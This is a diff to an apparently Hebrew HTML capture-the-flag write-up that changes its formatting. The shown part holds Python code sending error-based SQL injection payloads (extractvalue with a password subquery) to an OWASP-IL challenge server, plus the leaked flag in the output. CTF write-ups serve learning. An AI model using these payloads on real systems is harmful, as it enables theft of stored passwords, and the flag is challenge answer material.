@@ -2562,7 +2637,8 @@ dir=RTL></span><span lang=HE style='font-family:"Arial",sans-serif'><span
 dir=RTL></span> של </span><span lang=EN-US dir=LTR>MySQL</span><span dir=RTL></span><span
 lang=HE style='font-family:"Arial",sans-serif'><span dir=RTL></span>:</span></p>
 
-<pre>
+
+```python
 sql = "extractvalue(floor(0),concat(0x0a,(select(password)from(employees)where(id)like({}))))".format(13)
 r = requests.get("http://challenges.owaspil.ctf.today:8081/profile.php?id={}".format(sql))
 print ("{}".format(r.text))
@@ -2570,14 +2646,17 @@ print ("{}".format(r.text))
 sql = "extractvalue(floor(0),concat(0x0a,(select(right(password,31))from(employees)where(id)like({}))))".format(13)
 r = requests.get("http://challenges.owaspil.ctf.today:8081/profile.php?id={}".format(sql))
 print ("{}".format(r.text))
-</pre>
+```
+
 
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>התוצאה:</span></p>
-<pre>
+
+```
 SQL error: XPATH syntax error: 'OWASP-IL{I_Am_The_WAF_Bypass_Ma'
 SQL error: XPATH syntax error: 'IL{I_Am_The_WAF_Bypass_Master!}'
-</pre>
+```
+
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
 embed'><span lang=HE style='font-family:"Arial",sans-serif'>כלומר, הדגל הוא:</span></p>
 <p class=MsoNormal dir=RTL style='text-align:right;direction:rtl;unicode-bidi:
@@ -2590,6 +2669,3 @@ lang=en-IL dir=LTR>Frank Morris</span><span dir=RTL></span><span lang=HE
 style='font-family:"Arial",sans-serif'><span dir=RTL></span>? האגדה אומרת שהוא
 הצליח לברוח מכלא אלקטרז יחד עם שני אסירים נוספים, ואף אחד לא ראה אותם מאז.</span></p>
 <p class=MsoNormal><span lang=HE dir=RTL style='font-family:"Arial",sans-serif'>&nbsp;</span></p>
-</div>
-</body>
-</html>
